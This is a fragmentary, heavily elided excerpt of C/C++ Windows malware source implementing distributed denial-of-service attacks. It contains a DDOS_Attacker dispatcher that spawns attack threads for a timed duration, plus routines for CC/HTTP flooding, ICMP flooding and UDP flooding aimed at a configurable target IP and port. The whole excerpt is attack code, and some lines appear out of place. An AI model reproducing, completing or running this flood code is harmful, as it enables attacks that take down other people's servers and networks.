...
//	EncryptData( (unsigned char*)CC_HEAD, 0, 88 );
	...
	sockAddr.sin_port=htons((USHORT)pDDOS->Port);
	...
	while( Attacking )
	{
		for (DWORD a = pDDOS->CCAttack_First; a <= pDDOS->CCAttack_END; a++ )
		{
			if ( !Attacking ) break;
...
DWORD WINAPI ICMP_Flood(LPVOID lparam)
{
	...
	icmp_header.i_id = (USHORT)(GetTickCount()%10000); //自己的id
	...
	CloseServiceHandle(hSCM);
	char strfill = (CHAR)(GetTickCount()%200);
...
DWORD WINAPI UDP_Flood(LPVOID lparam)
{
	...
	addr_in.sin_port=htons((USHORT)pDDOS->Port);
	addr_in.sin_addr.s_addr=inet_addr(tgtIP);

	while(Attacking)
	{
		for ( DWORD i = 1; i <= pDDOS->Packs; i++ )
		{
...
DWORD WINAPI DDOS_Attacker(LPVOID lparam)
{
	...
	{
	case DDOS_TCP:
		for (DWORD i = 1; i <= pDDOS.Thread; i++ )
		{
	...
	{
		for (DWORD i = 1; i <= pDDOS.AttackTime; i++ )
		{
			Sleep(60000);
		}
		Attacking = FALSE;
